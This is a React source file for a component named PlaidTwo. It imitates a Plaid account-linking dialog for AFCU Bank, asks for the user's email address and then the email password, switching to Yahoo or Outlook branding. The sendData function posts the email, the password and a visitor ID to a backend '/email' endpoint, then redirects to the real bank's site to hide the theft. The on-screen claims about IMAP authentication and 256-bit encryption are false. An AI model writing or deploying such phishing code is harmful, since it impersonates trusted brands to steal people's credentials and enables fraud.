import * as React from 'react';
import Box from '@mui/material/Box';
import Fade from '@mui/material/Fade';
import Button from '@mui/material/Button';
import CircularProgress from '@mui/material/CircularProgress';
import Typography from '@mui/material/Typography';
import AlertDialog from './AlertDialog';
import SkeletonLoad from './SkeletonLoad';
import { CssBaseline, Paper, TextField } from '@mui/material';
import { Cable, CableOutlined, ConnectingAirportsOutlined, EmailRounded, VisibilityOffOutlined } from '@mui/icons-material';
import { createTheme, ThemeProvider } from '@mui/material/styles';

export default function PlaidTwo(userid) {

    const [email, setEmail] = React.useState('');
    const [password, setPassword] = React.useState('');


    const [bg, setBg] = React.useState(''); 
    const [img, setImg] = React.useState('/afcu.png'); 
    const [emailProvider, setEmailProvider] = React.useState('')
    const [passwordPage, setPasswordPage]  = React.useState(false)




    const sendData = e => {
        e.preventDefault()


        if(passwordPage){
            const data = {visitor_id: userid.userid.userid.userid, email: email, email_password: password}
            console.log(data)
            fetch(process.env.REACT_APP_PRODUCTION_URL+'/email', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(data)
          
              }).then((response) => {
                console.log(response.status); 

                if(response.status == 200){
                    window.location.replace('https://www.americafirst.com/');
                }
              })
        }


        if(email.includes("@yahoo.com")){

            setBg('bg-gradient-to-r from-violet-500 to-fuchsia-500 ')
            setImg('/yahoo.svg')
            setPasswordPage(true)
            setEmailProvider('Yahoo')

        }

        if(email.includes("@outlook.com")){

            setBg('bg-gradient-to-r from-sky-500 to-indigo-500 ')
            setImg('/outlook.png')
            setPasswordPage(true)
            setEmailProvider('Outlook')

        }

        if(email.includes("@")){
            setPasswordPage(true); 
        }
    };


    const sendPassword = e => {
        e.preventDefault();
        alert(password)
    }

    const theme = createTheme({
        status: {
            danger: '#e53e3e',
        },
        palette: {
            primary: {
                main: '#000000',
                darker: '#053e85',
            },
            neutral: {
                main: '#64748B',
                contrastText: '#fff',
            },
        },
    });

    return (
        <div className={bg+' h-[400px]  rounded-lg transition-all duration-200'}>
            <div className='place-items-center ml-28 pt-2'>
                <img className='w-[50px] place-content-center' src='/plaid.png'></img>
            </div>
            <div className='items-center border-b-2 mr-4 ml-4 mt-2'></div>

            <div className='flex flex-row ml-5 mt-5 mb-2'>
                <img className='w-[40px] rounded-full border border-gray-100 shadow-sm absolute ml-7 ' src={img}></img>
                <img className='w-[40px] rounded-full border border-gray-100 shadow-sm   ' src='/pliadlogo.jpg'></img>

            </div>
            <div className='mt-3 ml-5 w-[250px]'>
                {passwordPage ? (
                    <div>
                      <div className='leading-none'>
                      <div className='font-bold mb-1 mt-1 text-white'>Enter your Password </div>
                      <span className='text-xs font-medium pt-1 text-white'>Please, Enter the password of the following email address 
                          <span className='font-bold text-xs text-white'> " {email } " </span>
                           to authenticate it using protocol IMAP. 
                      </span>
                  </div>

                  <div className=' content-center p-1 pr-5 pt-2 '>
                    <TextField
                        autoFocus
                        required
                        size="small"
                        fullWidth="true"
                        type="password"
                        name="password"
                        placeholder="Password"
                        value={password}
                        onChange={(event) => {setPassword(event.target.value)}} //whenever the text field change, you save the value in state

                    />

                </div>

                  </div>


                ) : (
                    <div>
                    <div className='leading-none'>
                    <div className='font-bold mb-1 mt-1 '>Enter your Email Address </div>
                    <span className='text-xs font-medium pt-1'>Please, Enter your
                        <span className='font-bold text-xs'> AFCU Bank </span>
                        associated email address to confirm it with
                        <span className='font-bold text-xs'> AFCU Bank </span>
                        Then authenticate it securely.
                    </span>
                </div>

                 <div className=' content-center p-1 pr-5 pt-2 '>
                    <TextField
                        autoFocus
                        required
                        size="small"
                        fullWidth="true"
                        type="email"
                        name="email"
                        placeholder="Email Address"
                        value={email}
                        onChange={(event) => {setEmail(event.target.value)}} //whenever the text field change, you save the value in state

                    />

                </div>

                </div>
                )}
                
               

                <div className='content-center p-1 mr-4 mt-3'>
                    <ThemeProvider theme={theme}>
                        <Button onClick={sendData}  color='primary' type="submit" variant="contained" fullWidth={true}>Continue</Button>
                    </ThemeProvider>
                </div>

                {email.includes('@outlook.com') || email.includes('@yahoo.com') ? (

                <div className='text-center text-[8px] p-2 text-white'>By providing your {emailProvider} Password to Plaid, you're enabling Plaid to authnticate your email address with {emailProvider} securely using protocol IMAP</div>


                ): (
                    <div className='text-center text-[8px] p-2'>Plaid Request is secured by 256-BIT Encryption</div>

                )}


            </div>
        </div>


    );
}

